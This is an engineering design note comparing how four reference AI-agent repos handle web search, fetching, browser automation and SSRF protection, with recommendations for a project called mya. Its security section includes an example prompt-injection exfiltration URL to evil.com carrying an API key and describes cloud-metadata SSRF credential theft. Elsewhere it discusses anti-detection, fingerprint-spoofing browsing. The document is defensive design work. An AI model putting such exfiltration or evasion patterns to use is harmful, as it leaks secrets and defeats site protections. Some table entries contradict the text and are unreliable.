# Web-Lookup Architecture — Deep Dive (reference repos)

> Round 3 deep read of the reference repos with REAL implementations (not just prompts). 2026-07-18.
> Complements `cross-system-web-lookup.md` (which catalogs tool inventories across ~30 systems).
> This doc compares the **architectures** of the 4 repos whose web-lookup is substantial enough to learn from.

## The four architectures

### 1. hermes-agent — plugin-façade + LLM-compression + multi-browser + blocklist-SSRF

**Search/extract (`tools/web_tools.py`):**
- Two tool façades: `web_search_tool` (sync, returns **metadata only** — URLs/titles/descriptions) and `web_extract_tool` (async, returns full page content). Explicit **search-then-fetch separation**: "Use web_extract_tool to get full content."
- **8 backends**, all registered as plugins via `plugins/web/<vendor>/__init__.py` + `agent.web_search_registry`: **tavily, exa, parallel, firecrawl, searxng, brave-free, ddgs, xai**. Firecrawl can route through a **Nous-hosted tool-gateway** (subscriber: `firecrawl-gateway.<domain>`).
- **Backend selection (`_get_backend`)**: `web.backend` config → else **priority-walk by env-var presence** (tavily > exa > parallel > firecrawl > firecrawl-gateway > searxng > brave-free > **ddgs**) → else plugin walk → default firecrawl. **`ddgs` is the only zero-key free backend** (availability = `import ddgs` succeeds) — the zero-config search floor.
- **Per-capability override**: `web.search_backend` and `web.extract_backend` can differ (e.g. SearXNG for search + Firecrawl for extract).
- **Capability discrimination**: brave-free / ddgs / searxng are **search-only**; firecrawl / tavily / exa / parallel are **extract-capable**. Configuring a search-only backend for extract → typed error ("X is a search-only backend... set web.extract_backend to firecrawl/tavily/exa/parallel"), **no silent backend switch**.
- **`_is_backend_available` = cheap env-probe, never network** (deliberate: runs on every dispatch + every `hermes tools` repaint; the xai probe explicitly avoids OAuth refresh).
- **web_extract = NO LLM summarization** (corrects an earlier over-claim): backends already return boilerplate-stripped clean content; tool returns it directly. Pages over `char_limit` (default 15000) get **head+tail truncated + a footer telling the model how to `read_file` the omitted middle from `cache/web`**. Inline base64 images → `[IMAGE: alt]` placeholders; real image URLs preserved.
- Debug mode logs every call + size/compression metrics to `web_tools_debug_UUID.json`.
- **3 security layers on extract**: (1) **secret-in-URL block** — URL-decode first to catch percent-encoded secrets (`%73k-` → `sk-`), `_PREFIX_RE` API-key regex + `sensitive_query_param_name()`; (2) **IP-level SSRF pre-filter** `async_is_safe_url()` blocks private/internal addresses **before any backend dispatch**; (3) provider-internal re-check (firecrawl per-URL loop).

**Browser (`tools/browser_*.py` — FIVE backends):**
- `browser_supervisor.py` (orchestrator), `browser_tool.py` (main), `browser_cdp_tool.py` (CDP attach), `browser_dialog_tool.py` (dialog handling), `browser_camofox.py` + `browser_camofox_state.py` (Camoufox/Firefox **anti-detection**, for scraping-at-scale). Plus `browser_connect.py` in the CLI.
- Backends per docstring: local Chromium (headless, zero-cost), Browserbase (cloud), Browser Use (cloud), Camofox (anti-fingerprint local).
- Perception via **accessibility-tree snapshots** (`ariaSnapshot`), element refs `@e1`/`@e2`.

**SSRF / URL policy — two complementary mechanisms:**
- `tools/website_policy.py` — **domain blocklist** (fnmatch + urlparse) from `~/.hermes/config.yaml` + shared list files; **in-memory cache, 30s TTL**, thread-locked. Lightweight (no heavy config stack). Used by browser/manual URL policy.
- `web_extract_tool` — **IP-level SSRF pre-filter** (`async_is_safe_url`) + **secret-in-URL block** (see above). So hermes does BOTH domain-pattern blocking (browser) AND IP-resolution SSRF (extract) — the gap vs openclaw's `net-policy` is smaller than first read suggested; openclaw's advantage is packaging it as a reusable **core library** (ipv4/ip/url-protocol/userinfo/redact) any consumer imports, vs hermes inlining `async_is_safe_url` inside the tool.

**Deferred tools (`tools/tool_search.py`) — progressive tool disclosure:**
- MCP + non-core plugin tools replaced by 3 bridge tools: `tool_search`, `tool_describe`, `tool_call`. Core tools (`_HERMES_CORE_TOOLS`) **never** deferred.
- **Threshold gate**: if deferrable tools < **10%** of context window → no-op passthrough. Smart — only defer when worth it.
- **Catalog rebuilt every assembly (stateless)** — explicitly the lesson from *"OpenClaw's cron regression (openclaw/openclaw#84141): a session-keyed catalog drifts out of sync → silent tool dropouts"*. **hermes credits openclaw as the origin** of this pattern (`openclaw-tool-search-report`).
- Bridge tools route through the same `handle_function_call` → guardrails, hooks, approval, truncation all fire identically; display/trajectory unwrap shows the underlying tool.

**Also**: `x_search_tool.py` (Twitter/X search), `session_search_tool.py`, `plugins/web/tavily/provider.py`.

### 2. openclaw — web-content + net-policy as FIRST-CLASS CORE packages

Monorepo (`packages/`) where web lookup is split into two core packages:

**`web-content-core`** (`src/provider-runtime-shared.ts`):
- A **unified provider runtime** with `kind: "search" | "fetch"` — one abstraction, two modes. (Round 1 saw the discriminated union; the barrel `index.ts` just re-exports it.)
- The cleanest "web as core" design: search and fetch are not bolt-on tools but a typed core surface any plugin/host can consume.

**`net-policy`** (`src/{ip,ipv4,url-protocol,url-userinfo,redact-sensitive-url}.ts`):
- **Full SSRF policy**: IP/IPv4 resolution, protocol allowlist, userinfo stripping, sensitive-URL redaction.
- Heavier than hermes's domain-blocklist — openclaw resolves to IP (blocks DNS-rebinding to private/loopback), not just domain patterns.
- Treated as **core** because openclaw runs locally and hits arbitrary user-supplied URLs — same rationale as oh-my-pi.

**`tool-call-repair`** (separate core package): lenient tool-call parsing/repair — **the same feature mya implemented as Tier A3**. openclaw ships it as a standalone package; mya has it in `packages/tools/src/repair.ts`. Confirms the pattern is real and shared.

**Origin of deferred-tools**: openclaw is the system hermes credits for progressive tool disclosure (the `#84141` regression). So openclaw pioneered tool_search; hermes + grok + Claude adopted it.

### 3. openhuman — Rust registry + engine-selection + researcher-subagent contract

**`search/` domain (Rust):**
- `registry.rs` builds the active tool surface from `Config.search`.
- `engines/` — **one file per engine**: `managed`, `parallel`, `brave`, `querit`, `disabled`. Provider-specific registration stays isolated.
- `tools/` — `WebSearchTool`, Parallel, Brave, Querit, **SearXNG**, Seltz, **TinyFish**.
- **Engine-selection model**: `search.engine` config picks ONE; `disabled` → search tools **absent from the runtime tool list** (don't render in agent context — a context-hygiene win).
- `managed` = backend-proxied `web_search_tool` (like a gateway).

**Researcher subagent (`agent_registry/agents/researcher/`):**
- Dedicated agent owning `web_search_tool` + `web_fetch`.
- Has an explicit **"Research Loop Contract"** in its prompt:
  - search → fetch → answer; "don't keep broadening once you have source-backed evidence"
  - "prefer primary/authoritative sources over many secondary summaries"
  - "if search/fetch fails, return what happened under `Failed tool calls`; don't silently keep trying unrelated queries"
- This is the cleanest spec for a research subagent — same separation as Copilot CLI (orchestrator forbids web tools; research subagent owns them).

**Also**: `webview_accounts/`/`webview_apis/`/`webview_notifications/` (embedded browser/webview), `webhooks/`, `tool_registry/`, `agent_tool_policy/`, `tool_timeout/`. Rust-native harness with a registry-per-domain pattern.

### 4. oh-my-pi — config-richest (recap from Round 1, deepest configurability)
- **20 swappable search providers** (`web/search/providers/`: anthropic, brave, codex, duckduckgo, exa, firecrawl, gemini, jina, kagi, kimi, parallel, perplexity, searxng, tavily, tinyfish, xai, zai).
- **75+ structured site scrapers** (`web/scrapers/`: arxiv, github, npm, pypi, stackoverflow, mdn, docs.rs, …) — highest-fidelity Pull in the set.
- **`browser` tool** via `cmux` (Chrome DevTools multiplexer) + CDP attach + Aria snapshots; can spawn its own Chromium.
- Paired `fetch` with HTML→markdown + doc conversion (PDF/DOCX/...).

## Cross-repo patterns (architecture-level)

| Concern | hermes | openclaw | openhuman | oh-my-pi |
|---|---|---|---|---|
| Search abstraction | façade + 4 plugins | `web-content-core` (search\|fetch union) | per-engine registry | 20 providers, one tool |
| Backend count | 4 (Exa/Firecrawl/Parallel/Tavily) | (provider-runtime) | 5 engines + 7 tools | 20 |
| Result compression | **LLM (Gemini 3 Flash)** | — | (summarize in researcher prompt) | 75 structured scrapers |
| Browser backends | **5** (Chromium/Browserbase/Browser Use/Camofox/cdp) | none in core | webview_* | cmux/CDP + Aria |
| SSRF policy | **domain-blocklist** (fnmatch, 30s cache) | **full IP/SSRF core pkg** | (agent_tool_policy) | (net-policy concern) |
| Deferred tools | `tool_search` (credits openclaw, 10% threshold) | **origin** | — | — |
| Research subagent | — | — | **researcher + contract** | — |
| Tool-call repair | — | **core pkg** | — | — |
| Config model | `web.backend` (1 active) | core packages | `search.engine` (1, or disabled) | 20 selectable |

## What this means for mya (architectural recommendations)

mya today = none of these architectures. It has `browser_action` (truncated pi-computer-use port) + `paid_fetch` (x402) + empty MCP + dead `browser_*` + dead Composio. To get to parity, the 4 repos show **three distinct, composable layers** to build:

1. **Search/extract layer** — pick the openhuman registry model (one config key → one engine, `disabled` removes from context) OR the oh-my-pi multi-provider model. Backends: start free (DuckDuckGo/SearXNG via the existing MCP lifecycle), add Tavily/Brave as optional.
2. **Fetch layer** — a plain zero-config `web_fetch` (HTTP→markdown). hermes/openhuman/researcher-contract all treat fetch as the companion to search.
3. **Net-policy layer** — **port openclaw's `net-policy` package verbatim** (TypeScript, same stack as mya). Critical now that mya removed path containment.

Plus two cross-cutting wins mya already has half-built:
- **Deferred tools** (hermes/openclaw pattern) — mya registers all tools upfront; as the surface grows, adopt `tool_search` with the 10% threshold gate.
- **Tool-call repair** — mya Tier A3 (`packages/tools/src/repair.ts`) == openclaw's `tool-call-repair` core package. Already aligned.

---

## Browser engine: use `agent-browser` (Vercel, public npm) — NOT a re-port

`browser_tool.py` is ~4700 lines wrapping the **`agent-browser` CLI** — a **Rust-native CLI by Vercel Labs** (`github.com/vercel-labs/agent-browser`, npm `agent-browser` v0.32.2, hermes pins `^0.26.0`), purpose-built for AI-agent browser automation. **mya should `npm i agent-browser` (optional peer) and wrap it — NOT re-port pi-computer-use and NOT use generic Playwright-MCP.** agent-browser is the engine hermes (a sophisticated agent) relies on for its entire browser stack; it provides ariaSnapshot + navigate + click/type/scroll + Chromium management + CDP-cloud-connect out of the box.

### The wrap template (from `browser_tool.py` deep-read)

**Single dispatcher** `_run_browser_command(task_id, command, args)`:
```
agent-browser [--session <name> | --cdp <ws_url>] [--engine chrome|lightpanda] --json <command> [args]
  commands: open <url>, snapshot [-c], click <ref>, type <ref> <text>, scroll, back, press <key>, screenshot, console
  --json → structured output {success, data:{snapshot, refs, title, url, ...}}
```

**Hard-won gotchas (each a real bug hermes hit — port these verbatim):**
1. **Temp files for stdout/stderr, NOT pipes.** agent-browser spawns a background daemon that inherits fds; with `capture_output=True` (pipes) the daemon holds the pipe open after the CLI exits → `communicate()` never sees EOF → **deadlock until timeout**. Use temp-file fds + `proc.wait(timeout)`.
2. **Per-task socket dir** (`AGENT_BROWSER_SOCKET_DIR` per task) — without it, parallel workers fight over the default socket path → "Failed to create socket directory: Permission denied".
3. **Daemon self-kill** via `AGENT_BROWSER_IDLE_TIMEOUT_MS` (agent-browser 0.24+) — daemon kills itself + Chrome children after idle window; pair with Python-side inactive-session cleanup.
4. **`--no-sandbox` auto-inject** (`AGENT_BROWSER_ARGS=--no-sandbox,--disable-dev-shm-usage`) when root OR Ubuntu 23.10+/AppArmor (unprivileged userns restricted) — Chromium refuses to start otherwise (#15765).
5. **`--session` + `--cdp` are mutually exclusive** — in agent-browser >=0.13, `--session` creates a local browser and **silently ignores `--cdp`**. Cloud mode MUST use `--cdp` alone.
6. **Fail-fast** before Popen: no Chromium + not lightpanda → `_maybe_autoinstall_chromium()` or actionable error ("npx agent-browser install --with-deps").

**Security gauntlet (critical for mya — now unrestricted; ~90% of `browser_navigate`):**
1. **Secret-in-URL block** — `_PREFIX_RE` (API-key regex) on URL **and** URL-decoded form (catches `%2D` encoding: `sk%2Dant%2D...`). Rationale: prompt-injection → `evil.com/steal?key=sk-ant-...` exfil.
2. **SSRF cloud-metadata floor (UNCONDITIONAL)** — `_is_always_blocked_url` blocks `169.254.169.254`/`metadata.google.internal`/ECS metadata for **every backend including local headless Chromium** — "a local Chromium on a cloud VM still reaches the host IMDS → exfil IAM creds" (#16234).
3. **SSRF private/internal** (cloud backends only; local skipped since agent has local access).
4. **Post-redirect re-check** — after `open`, inspect `final_url`; if redirect landed on metadata/private → block result + navigate to `about:blank` to prevent snapshot leaks.
5. **Domain blocklist** (`check_website_access`).
6. **Bot-detection awareness** — scan title for patterns ("captcha", "cloudflare", "just a moment", "bot detected") → warn model with mitigation options.

**UX wins:** auto-compact-snapshot after navigate (`snapshot -c`) so the model can act without a second call; report active stealth features + `stealth_warning` if no proxies; hybrid routing (`auto_local_for_private_urls` → public URLs to cloud, private URLs auto-spawn local Chromium sidecar so the cloud provider never sees them).

### Provider/cloud layer (optional, later)
`BrowserProvider` ABC (mirrors `WebSearchProvider`): `name`, `is_available`, `create_session(task_id)→{session_name, bb_session_id, cdp_url, features}`, `close_session`, `emergency_cleanup`. Cloud providers (browserbase/browser_use/firecrawl) create a remote session and return a **`cdp_url`** that `agent-browser --cdp` connects to. browserbase: stealth+proxies with **402-fallback** (drop premium feature + retry). Only needed if mya wants cloud browser; the local `--session` path needs no provider.

### Camofox (anti-detect, optional much later)
Self-hosted **Firefox + C++ fingerprint-spoof REST microservice** (`CAMOFOX_URL`), API maps 1:1 to the browser tool: `/tabs/{id}/{navigate,snapshot,click,type,scroll,screenshot}`. Same interface as agent-browser, chosen when `_is_camofox_mode()`. Only relevant if mya needs scraping-at-scale anti-detection; skip for v1.
